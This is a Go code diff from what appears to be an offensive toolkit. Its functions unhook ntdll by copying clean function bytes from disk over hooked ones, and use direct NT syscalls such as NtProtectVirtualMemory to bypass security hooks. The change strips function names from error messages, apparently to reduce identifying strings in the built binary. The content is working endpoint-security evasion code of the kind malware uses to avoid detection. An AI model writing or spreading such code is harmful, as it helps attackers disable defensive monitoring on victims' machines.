@@ -50,13 +50,13 @@ func ClassicUnhook(funcName string, caller *wsyscall.Caller) error {
 	// Find the export RVA and read first 5 bytes from .text section
 	freshBytes, err := readExportBytes(freshDLL, rawBytes, funcName, 5)
 	if err != nil {
-		return fmt.Errorf("read export %s: %w", funcName, err)
+		return fmt.Errorf("read export: %w", err)
 	}
 
 	// Get the address of the function in the loaded (hooked) ntdll
 	proc := api.Ntdll.NewProc(funcName)
 	if err := proc.Find(); err != nil {
-		return fmt.Errorf("find loaded %s: %w", funcName, err)
+		return fmt.Errorf("find loaded function: %w", err)
 	}
 
 	// Overwrite the hooked bytes with the clean ones
@@ -106,7 +106,7 @@ func FullUnhook(caller *wsyscall.Caller) error {
 	var oldProtect uint32
 	if caller != nil {
 		// Route through NT syscalls to bypass potential hooks on VirtualProtect/WriteProcessMemory.
-		process := uintptr(0xFFFFFFFFFFFFFFFF) // current process pseudo-handle
+		process := ^uintptr(0) // current process pseudo-handle
 		baseAddr := textAddr
 		regionSize := textSize
 		r, err := caller.Call("NtProtectVirtualMemory",
@@ -255,7 +255,7 @@ func PerunUnhookTarget(target string, caller *wsyscall.Caller) error {
 	localTextAddr := localBase + uintptr(textVA)
 	var oldProtect uint32
 	if caller != nil {
-		process := uintptr(0xFFFFFFFFFFFFFFFF)
+		process := ^uintptr(0)
 		baseAddr := localTextAddr
 		regionSize := uintptr(textSize)
 		r, err := caller.Call("NtProtectVirtualMemory",
@@ -369,10 +369,10 @@ func readExportBytes(f *pe.File, raw []byte, name string, n int) ([]byte, error)
 			funcRVA := binary.LittleEndian.Uint32(raw[functionsOff+uint32(ordinal)*4:])
 			funcOff := rvaToOffset(f, funcRVA)
 			if funcOff == 0 {
-				return nil, fmt.Errorf("cannot resolve function offset for %s", name)
+				return nil, fmt.Errorf("cannot resolve function offset")
 			}
 			if funcOff+uint32(n) > uint32(len(raw)) {
-				return nil, fmt.Errorf("function %s at offset %d exceeds file size", name, funcOff)
+				return nil, fmt.Errorf("function offset exceeds file size")
 			}
 			result := make([]byte, n)
 			copy(result, raw[funcOff:funcOff+uint32(n)])
@@ -380,7 +380,7 @@ func readExportBytes(f *pe.File, raw []byte, name string, n int) ([]byte, error)
 		}
 	}
 
-	return nil, fmt.Errorf("export %s not found in PE", name)
+	return nil, fmt.Errorf("export not found in PE")
 }
 
 // rvaToOffset converts an RVA to a file offset using section headers.
